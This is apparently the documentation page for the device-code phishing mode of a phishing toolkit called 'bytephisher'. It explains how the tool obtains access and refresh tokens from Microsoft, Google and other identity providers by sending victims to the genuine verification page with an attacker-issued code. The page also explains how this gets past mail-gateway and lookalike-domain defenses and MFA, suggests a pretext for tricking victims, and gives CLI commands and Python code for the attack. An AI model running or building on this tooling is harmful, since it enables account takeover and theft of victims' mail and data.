# Device-authorization relay (RFC 8628)

`--devicecode PROVIDER` is a second, completely different path to the same prize as
the reverse proxy, and in several ways a harder one to defend against.

## Why it exists

The proxy in `core/proxy.py` needs the victim to be looking at a page **we** serve, on
a domain **we** control. That is a lot to get past in 2026: mail gateways rewrite and
detonate links, browsers and endpoint agents classify lookalike domains, certificate
transparency and newly-registered-domain scoring flag the infrastructure, and a
phishlet has to keep up with the real site's client-side integrity checks.

The device-authorization grant needs none of that. You start the flow with the
identity provider, the provider hands **you** a short code, and you send the victim to
the provider's **genuine** verification page with it. They approve the request where
they always do; the provider then gives *your* client the tokens over its own token
endpoint.

```
   operator                    provider                        victim
      |                           |                              |
      |-- POST /devicecode ------>|                              |
      |<-- user_code, uri --------|                              |
      |                           |<---- opens the REAL uri -----|
      |                           |<---- types the code ---------|
      |                           |<---- approves (MFA/passkey) -|
      |-- POST /token (poll) ---->|                              |
      |<-- access_token, refresh -|                              |
```

What follows from that:

* no lookalike domain, no cloned page, no proxy TLS to fingerprint;
* the address bar is the provider's own, so the usual "look at the URL" advice is
  satisfied;
* MFA is performed by the victim on the real page, and **a passkey works too**,
  because the ceremony happens where it is supposed to.

## Usage

```bash
# register an application with the device-code flow enabled, then:
python3 bytephisher.py --devicecode microsoft \
    --dc-client-id <your-public-client-id> \
    --dc-tenant contoso.onmicrosoft.com \
    --dc-scope "offline_access https://graph.microsoft.com/Mail.Read" \
    --dc-base https://<your-tunnel-host> \
    --port 8080 -t cloudflared
```

The console prints the code, the real verification URL, and the landing path:

```
[bytephisher] mode     : DEVICE CODE (microsoft)
[bytephisher] landing  : http://<host>:8080/dc/dc1759940000-<tag>
[bytephisher] send the victim: https://microsoft.com/devicelogin and the code KQ7T-4MP2

[bytephisher] *** DEVICE CODE APPROVED *** dc1759940000-<tag> (microsoft)
    code     : KQ7T-4MP2
    access   : eyJ0eXAiOiJ...
    refresh  : yes
```

The landing page (`/dc/<tag>`) shows the code, offers a copy button and a button that
opens the **real** `verification_uri`, and polls `/__bh/dc/<tag>/status` so it can tell
the victim they are done. Nothing on it imitates the provider - that is the point of
the technique, and `tests/test_devicecode.py` asserts it (no `login.microsoftonline.com`,
no `password` field anywhere in the page).

Programmatic use:

```python
from core import devicecode as dc

mgr = dc.DeviceCodeManager()
flow = mgr.start("microsoft", "<client-id>", tenant="contoso.onmicrosoft.com")
print(flow.instructions())                 # code + the genuine URL
httpd, poller = dc.serve(mgr, 8080, link_prefix="https://camp.example",
                         on_token=lambda rec: print(rec["tokens"]))
```

## Providers

| provider | device endpoint | verified live |
|---|---|---|
| `microsoft`, `microsoft-graph` | `.../{tenant}/oauth2/v2.0/devicecode` | **yes** - answers `unauthorized_client`/`invalid_grant`, i.e. a real OAuth error |
| `google` | `https://oauth2.googleapis.com/device/code` | **yes** - answers `invalid_client`; note `/devicecode` is a **404** |
| `okta` | `{issuer}/v1/device` | documented (needs a tenant to probe) |
| `github` | `https://github.com/login/device/code` | documented only - an unregistered client id gets a 404 `Not Found` |
| `custom` | `{tenant}/devicecode` | for a lab IdP, Keycloak, Authentik, ... |

`--dc-client-id` is required and deliberately has no default: first-party CLI ids
change and are policy-dependent per tenant, and shipping a guessed one produces a
silent failure. Register your own public client.

## Honest limits

* **A tenant that blocks the grant wins.** `unauthorized_client` / `invalid_grant` at
  `/devicecode` means the tenant disabled the flow for that client, or conditional
  access demands a compliant/managed device. There is no workaround from here.
  The error is surfaced verbatim rather than disguised as success.
* **The tokens carry that client's permissions**, not a browser session. How much that
  is worth depends on the app you registered and what the tenant consents to.
* **Approval is visible to the victim.** They read a code and click Approve; this is
  not silent like a proxied login. It is also why it is worth pairing with a plausible
  pretext ("IT is enabling your new laptop").
* **Detection is on the IdP's side** (a public client asking for a device grant from an
  unmanaged device), which is a signal the operator cannot see or remove.
* Tokens are vaulted, not just printed: `session.add_oauth()` writes the access token,
  the refresh token, the granted scopes and the expiry into the session record (keyed
  `dc-<tag>`, the same database as every other session), and `oauth_valid` /
  `oauth_summary` read them back. Verified live: a **fresh process** reads the token, its
  scopes and its expiry out of the database after a restart (`tests/test_oauth_vault.py`,
  23 tests). If the write itself fails, the full token set is spooled to
  `data/dc-failed-<tag>.json` and the path is printed - the refresh token is never lost
  silently.

## Tests

`tests/test_devicecode.py` (28 tests) drives a fake RFC 8628 provider and covers the
pending -> slow_down -> token sequence, the expired/denied/blocked-tenant refusals, the
form-encoded request contract, the landing page and its status route, the header
hygiene (one `Server`, one `Date`, never a Python banner), the background poller, the
`custom`-provider CLI end to end in a real subprocess, and - marked `live` - a probe of
Microsoft's and Google's real endpoints that fails if the path ever regresses.
